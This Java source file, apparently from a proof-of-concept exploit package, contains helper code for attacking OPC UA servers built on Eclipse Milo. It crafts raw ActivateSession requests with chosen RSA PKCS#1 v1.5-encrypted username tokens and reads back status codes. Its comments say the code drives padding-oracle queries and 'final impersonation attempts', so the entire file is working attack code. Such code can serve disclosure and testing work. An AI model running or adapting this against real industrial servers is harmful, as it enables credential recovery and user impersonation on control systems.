package poc.common;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.security.cert.X509Certificate;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import javax.crypto.Cipher;
import org.eclipse.milo.opcua.sdk.client.OpcUaClient;
import org.eclipse.milo.opcua.stack.core.UaException;
import org.eclipse.milo.opcua.stack.core.security.SecurityAlgorithm;
import org.eclipse.milo.opcua.stack.core.types.builtin.ByteString;
import org.eclipse.milo.opcua.stack.core.types.builtin.ExtensionObject;
import org.eclipse.milo.opcua.stack.core.types.builtin.NodeId;
import org.eclipse.milo.opcua.stack.core.types.builtin.StatusCode;
import org.eclipse.milo.opcua.stack.core.types.structured.ActivateSessionRequest;
import org.eclipse.milo.opcua.stack.core.types.structured.ActivateSessionResponse;
import org.eclipse.milo.opcua.stack.core.types.structured.RequestHeader;
import org.eclipse.milo.opcua.stack.core.types.structured.SignatureData;
import org.eclipse.milo.opcua.stack.core.types.structured.SignedSoftwareCertificate;
import org.eclipse.milo.opcua.stack.core.types.structured.UserNameIdentityToken;

/**
 * Raw {@code ActivateSession} "identity change" helpers -- every oracle query and every proof
 * step goes through here. Nothing in this class ever touches a private key; {@link
 * #encryptToken} is ordinary RSA public-key encryption against the server's own certificate,
 * exactly what any client does to submit a username token.
 */
public final class RawActivate {

  private RawActivate() {}

  public static CompletableFuture<StatusCode> rawActivateAsync(
      OpcUaClient client, NodeId authToken, String policyId, String username, byte[] passwordCt) {
    UserNameIdentityToken token =
        new UserNameIdentityToken(
            policyId, username, ByteString.of(passwordCt), SecurityAlgorithm.Rsa15.getUri());
    RequestHeader header = client.newRequestHeader(authToken);
    SignatureData noSig = new SignatureData(null, null);
    ActivateSessionRequest req =
        new ActivateSessionRequest(
            header,
            noSig,
            new SignedSoftwareCertificate[0],
            client.getConfig().getSessionLocaleIds(),
            ExtensionObject.encode(client.getStaticEncodingContext(), token),
            noSig);
    return client
        .getTransport()
        .sendRequestMessage(req)
        .handle(
            (resp, ex) -> {
              if (ex != null) {
                Throwable c = ex;
                while (c.getCause() != null && !(c instanceof UaException)) {
                  c = c.getCause();
                }
                if (c instanceof UaException ua) {
                  return ua.getStatusCode();
                }
                throw new RuntimeException(ex);
              }
              return ((ActivateSessionResponse) resp).getResponseHeader().getServiceResult();
            });
  }

  public static StatusCode rawActivate(
      OpcUaClient client, NodeId authToken, String policyId, String username, byte[] passwordCt)
      throws Exception {
    return rawActivateAsync(client, authToken, policyId, username, passwordCt)
        .get(60, TimeUnit.SECONDS);
  }

  /**
   * Ordinary RSA/PKCS1 public-key encryption of a chosen password+nonce plaintext against the
   * server's own certificate. This is NOT decryption and requires no secret -- any anonymous
   * client can do this with the server's already-public certificate. Used both to build the
   * "valid padding, wrong password" oracle-confirmation probe and the final impersonation
   * attempts.
   */
  public static byte[] encryptToken(X509Certificate serverCert, String password, byte[] nonce)
      throws Exception {
    byte[] plain = buildTokenPlainText(password.getBytes(StandardCharsets.UTF_8), nonce);
    Cipher enc = Cipher.getInstance(SecurityAlgorithm.Rsa15.getTransformation());
    enc.init(Cipher.ENCRYPT_MODE, serverCert.getPublicKey());
    return enc.doFinal(plain);
  }

  public static byte[] buildTokenPlainText(byte[] passwordBytes, byte[] nonceBytes) {
    int length = passwordBytes.length + nonceBytes.length;
    ByteBuffer buffer = ByteBuffer.allocate(4 + length).order(ByteOrder.LITTLE_ENDIAN);
    buffer.putInt(length);
    buffer.put(passwordBytes);
    buffer.put(nonceBytes);
    return buffer.array();
  }

  public static String describe(StatusCode s) {
    return String.format("0x%08X (%s)", s.getValue(), s);
  }
}
